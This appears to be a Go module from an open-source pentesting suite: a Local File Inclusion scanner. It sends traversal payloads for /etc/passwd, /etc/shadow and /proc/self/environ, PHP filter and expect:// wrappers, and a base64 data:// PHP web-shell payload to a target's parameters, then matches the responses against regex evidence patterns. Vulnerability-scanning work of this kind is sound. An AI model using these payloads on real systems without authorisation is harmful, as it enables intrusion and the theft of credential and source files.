/*
·━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━·
:                                                                               :
:   █▀ █ █▀▀   ·   Blazing-fast pentesting suite                                :
:   ▄█ █ █▀    ·   BSD 3-Clause License                                         :
:                                                                               :
:   (c) 2022-2025 vmfunc, xyzeva,                                               :
:                 lunchcat alumni & contributors                                :
:                                                                               :
·━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━·
*/

package scan

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/charmbracelet/log"
	"github.com/dropalldatabases/sif/internal/styles"
	"github.com/dropalldatabases/sif/pkg/logger"
)

// LFIResult represents the results of LFI reconnaissance
type LFIResult struct {
	Vulnerabilities []LFIVulnerability `json:"vulnerabilities,omitempty"`
	TestedParams    int                `json:"tested_params"`
	TestedPayloads  int                `json:"tested_payloads"`
}

// LFIVulnerability represents a detected LFI vulnerability
type LFIVulnerability struct {
	URL          string `json:"url"`
	Parameter    string `json:"parameter"`
	Payload      string `json:"payload"`
	Evidence     string `json:"evidence"`
	Severity     string `json:"severity"`
	FileIncluded string `json:"file_included,omitempty"`
}

// LFI payloads for directory traversal
var lfiPayloads = []struct {
	payload  string
	target   string
	severity string
}{
	// Linux/Unix paths
	{"../../../../../../../etc/passwd", "/etc/passwd", "high"},
	{"....//....//....//....//....//etc/passwd", "/etc/passwd", "high"},
	{"..%2f..%2f..%2f..%2f..%2fetc/passwd", "/etc/passwd", "high"},
	{"..%252f..%252f..%252f..%252fetc/passwd", "/etc/passwd", "high"},
	{"%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "/etc/passwd", "high"},
	{"....\\....\\....\\....\\etc\\passwd", "/etc/passwd", "high"},
	{"/etc/passwd", "/etc/passwd", "high"},
	{"/etc/passwd%00", "/etc/passwd", "high"},
	{"../../../../../../../etc/shadow", "/etc/shadow", "critical"},
	{"../../../../../../../proc/self/environ", "/proc/self/environ", "high"},
	{"../../../../../../../var/log/apache2/access.log", "apache access log", "medium"},
	{"../../../../../../../var/log/apache2/error.log", "apache error log", "medium"},
	{"../../../../../../../var/log/nginx/access.log", "nginx access log", "medium"},
	{"../../../../../../../var/log/nginx/error.log", "nginx error log", "medium"},

	// Windows paths
	{"..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows hosts", "high"},
	{"../../../../../../../windows/system32/drivers/etc/hosts", "windows hosts", "high"},
	{"..\\..\\..\\..\\boot.ini", "boot.ini", "high"},
	{"../../../../../../../boot.ini", "boot.ini", "high"},
	{"..\\..\\..\\..\\windows\\win.ini", "win.ini", "medium"},

	// PHP wrappers
	{"php://filter/convert.base64-encode/resource=index.php", "php source", "high"},
	{"php://filter/read=convert.base64-encode/resource=config.php", "php config", "critical"},
	{"expect://id", "command execution", "critical"},
	{"php://input", "php input", "high"},
	{"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "data wrapper", "critical"},
}

// Evidence patterns for LFI detection
var lfiEvidencePatterns = []struct {
	pattern     *regexp.Regexp
	description string
	severity    string
}{
	{regexp.MustCompile(`root:.*:0:0:`), "/etc/passwd content", "high"},
	{regexp.MustCompile(`daemon:.*:1:1:`), "/etc/passwd content", "high"},
	{regexp.MustCompile(`nobody:.*:65534:`), "/etc/passwd content", "high"},
	{regexp.MustCompile(`\[boot loader\]`), "boot.ini content", "high"},
	{regexp.MustCompile(`\[operating systems\]`), "boot.ini content", "high"},
	{regexp.MustCompile(`; for 16-bit app support`), "win.ini content", "medium"},
	{regexp.MustCompile(`\[fonts\]`), "win.ini content", "medium"},
	{regexp.MustCompile(`127\.0\.0\.1\s+localhost`), "hosts file content", "medium"},
	{regexp.MustCompile(`DOCUMENT_ROOT=`), "/proc/self/environ content", "high"},
	{regexp.MustCompile(`PATH=.*:/usr`), "environment variables", "high"},
	{regexp.MustCompile(`<\?php`), "PHP source code", "high"},
	{regexp.MustCompile(`PD9waHA`), "base64 encoded PHP", "high"},
}

// Common parameters to test
var commonLFIParams = []string{
	"file", "page", "path", "include", "doc", "document",
	"folder", "root", "pg", "style", "pdf", "template",
	"php_path", "lang", "language", "view", "content",
	"layout", "mod", "conf", "url", "dir", "show",
	"name", "cat", "action", "read", "load", "open",
}

// LFI performs LFI (Local File Inclusion) reconnaissance on the target URL
func LFI(targetURL string, timeout time.Duration, threads int, logdir string) (*LFIResult, error) {
	fmt.Println(styles.Separator.Render("📁 Starting " + styles.Status.Render("LFI reconnaissance") + "..."))

	sanitizedURL := strings.Split(targetURL, "://")[1]

	if logdir != "" {
		if err := logger.WriteHeader(sanitizedURL, logdir, "LFI reconnaissance"); err != nil {
			log.Errorf("Error creating log file: %v", err)
			return nil, err
		}
	}

	lfilog := log.NewWithOptions(os.Stderr, log.Options{
		Prefix: "LFI 📁",
	}).With("url", targetURL)

	lfilog.Infof("Starting LFI reconnaissance...")

	result := &LFIResult{
		Vulnerabilities: []LFIVulnerability{},
	}

	var mu sync.Mutex
	var wg sync.WaitGroup

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	// parse the target URL to check for existing parameters
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse URL: %w", err)
	}

	existingParams := parsedURL.Query()
	paramsToTest := make(map[string]bool)

	// add existing parameters
	for param := range existingParams {
		paramsToTest[param] = true
	}

	// add common LFI parameters
	for _, param := range commonLFIParams {
		paramsToTest[param] = true
	}

	result.TestedParams = len(paramsToTest)
	result.TestedPayloads = len(lfiPayloads)

	lfilog.Infof("Testing %d parameters with %d payloads", len(paramsToTest), len(lfiPayloads))

	// create work items
	type workItem struct {
		param   string
		payload struct {
			payload  string
			target   string
			severity string
		}
	}

	workItems := make([]workItem, 0, len(paramsToTest)*len(lfiPayloads))
	for param := range paramsToTest {
		for _, payload := range lfiPayloads {
			workItems = append(workItems, workItem{param: param, payload: payload})
		}
	}

	// distribute work
	workChan := make(chan workItem, len(workItems))
	for _, item := range workItems {
		workChan <- item
	}
	close(workChan)

	wg.Add(threads)
	for t := 0; t < threads; t++ {
		go func() {
			defer wg.Done()
			for item := range workChan {
				// build test URL
				testParams := url.Values{}
				for k, v := range existingParams {
					if k != item.param {
						testParams[k] = v
					}
				}
				testParams.Set(item.param, item.payload.payload)

				testURL := fmt.Sprintf("%s://%s%s?%s",
					parsedURL.Scheme,
					parsedURL.Host,
					parsedURL.Path,
					testParams.Encode())

				resp, err := client.Get(testURL)
				if err != nil {
					log.Debugf("Error testing %s: %v", testURL, err)
					continue
				}

				body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*100))
				resp.Body.Close()
				if err != nil {
					continue
				}

				bodyStr := string(body)

				// check for evidence patterns
				for _, evidence := range lfiEvidencePatterns {
					if evidence.pattern.MatchString(bodyStr) {
						mu.Lock()
						// check for duplicates
						duplicate := false
						for _, v := range result.Vulnerabilities {
							if v.Parameter == item.param && v.Payload == item.payload.payload {
								duplicate = true
								break
							}
						}
						if !duplicate {
							vuln := LFIVulnerability{
								URL:          testURL,
								Parameter:    item.param,
								Payload:      item.payload.payload,
								Evidence:     evidence.description,
								Severity:     item.payload.severity,
								FileIncluded: item.payload.target,
							}
							result.Vulnerabilities = append(result.Vulnerabilities, vuln)

							lfilog.Warnf("LFI vulnerability found: %s in param [%s] - %s",
								styles.SeverityHigh.Render(evidence.description),
								styles.Highlight.Render(item.param),
								styles.Status.Render(item.payload.target))

							if logdir != "" {
								logger.Write(sanitizedURL, logdir,
									fmt.Sprintf("LFI: %s in param [%s] via payload [%s]\n",
										evidence.description, item.param, item.payload.payload))
							}
						}
						mu.Unlock()
						break
					}
				}
			}
		}()
	}
	wg.Wait()

	// summary
	if len(result.Vulnerabilities) > 0 {
		lfilog.Warnf("Found %d LFI vulnerabilities", len(result.Vulnerabilities))
		criticalCount := 0
		highCount := 0
		for _, v := range result.Vulnerabilities {
			if v.Severity == "critical" {
				criticalCount++
			} else if v.Severity == "high" {
				highCount++
			}
		}
		if criticalCount > 0 {
			lfilog.Errorf("%d CRITICAL vulnerabilities found!", criticalCount)
		}
		if highCount > 0 {
			lfilog.Warnf("%d HIGH severity vulnerabilities found", highCount)
		}
	} else {
		lfilog.Infof("No LFI vulnerabilities detected")
		return nil, nil
	}

	return result, nil
}

// DetectLFIFromResponse checks a response body for LFI evidence
func DetectLFIFromResponse(body string) (bool, string) {
	for _, evidence := range lfiEvidencePatterns {
		if evidence.pattern.MatchString(body) {
			return true, evidence.description
		}
	}
	return false, ""
}
